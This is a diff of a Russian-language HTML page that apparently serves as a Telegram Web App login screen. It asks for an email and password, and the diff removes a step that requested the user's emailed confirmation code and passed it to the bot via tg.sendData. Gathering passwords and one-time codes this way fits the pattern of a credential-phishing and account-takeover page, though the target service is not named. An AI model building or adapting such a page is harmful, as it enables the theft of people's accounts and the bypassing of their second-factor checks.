@@ -34,12 +34,8 @@
             border: 2px solid #e0e0e0;
             border-radius: 10px;
             font-size: 16px;
-            transition: border-color 0.3s;
         }
-        .form-group input:focus {
-            outline: none;
-            border-color: #667eea;
-        }
+        .form-group input:focus { outline: none; border-color: #667eea; }
         .btn-primary {
             width: 100%;
             padding: 14px;
@@ -50,10 +46,7 @@
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: transform 0.2s;
         }
-        .btn-primary:hover { transform: translateY(-2px); }
-        .btn-primary:active { transform: translateY(0); }
         .btn-support {
             width: 100%;
             padding: 12px;
@@ -65,7 +58,6 @@
             cursor: pointer;
             margin-top: 10px;
         }
-        .btn-support:hover { background: #e8e8e8; }
         .message {
             margin-top: 20px;
             padding: 12px;
@@ -77,7 +69,6 @@
         .message.error { display: block; background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
         .message.info { display: block; background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
         .footer { margin-top: 20px; }
-        #codeForm { margin-top: 20px; display: none; }
     </style>
 </head>
 <body>
@@ -97,14 +88,6 @@
             <button id="submitBtn" class="btn-primary">🔓 Войти</button>
         </div>
 
-        <div id="codeForm">
-            <div class="form-group">
-                <label for="codeInput">📧 Код подтверждения</label>
-                <input type="text" id="codeInput" placeholder="Введите код с почты">
-            </div>
-            <button id="submitCodeBtn" class="btn-primary">✅ Подтвердить</button>
-        </div>
-
         <div id="message" class="message"></div>
         
         <div class="footer">
@@ -118,12 +101,8 @@
         
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
-        const codeInput = document.getElementById('codeInput');
         const submitBtn = document.getElementById('submitBtn');
-        const submitCodeBtn = document.getElementById('submitCodeBtn');
         const messageDiv = document.getElementById('message');
-        const loginForm = document.getElementById('loginForm');
-        const codeForm = document.getElementById('codeForm');
         
         function showMessage(text, type = 'info') {
             messageDiv.textContent = text;
@@ -131,7 +110,6 @@
             setTimeout(() => { messageDiv.style.display = 'none'; }, 5000);
         }
         
-        // Отправка данных
         submitBtn.addEventListener('click', function() {
             const email = emailInput.value.trim();
             const password = passwordInput.value.trim();
@@ -153,40 +131,13 @@
             }
         });
         
-        // Отправка кода
-        submitCodeBtn.addEventListener('click', function() {
-            const code = codeInput.value.trim();
-            if (!code) {
-                showMessage('Введите код', 'error');
-                return;
-            }
-            
-            try {
-                tg.sendData(JSON.stringify({ code: code }));
-                showMessage('✅ Код отправлен!', 'success');
-                codeInput.value = '';
-                codeForm.style.display = 'none';
-                loginForm.style.display = 'block';
-            } catch (error) {
-                showMessage('❌ Ошибка отправки', 'error');
-            }
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') submitBtn.click();
         });
-        
-        // Enter
-        emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') passwordInput.focus(); });
-        passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') submitBtn.click(); });
-        codeInput.addEventListener('keypress', e => { if (e.key === 'Enter') submitCodeBtn.click(); });
         
         function openSupport() {
             window.open('https://t.me/potok457', '_blank');
         }
-        
-        // Показываем форму кода если нужно
-        window.showCodeForm = function() {
-            loginForm.style.display = 'none';
-            codeForm.style.display = 'block';
-            showMessage('Введите код с почты', 'info');
-        };
     </script>
 </body>
 </html>
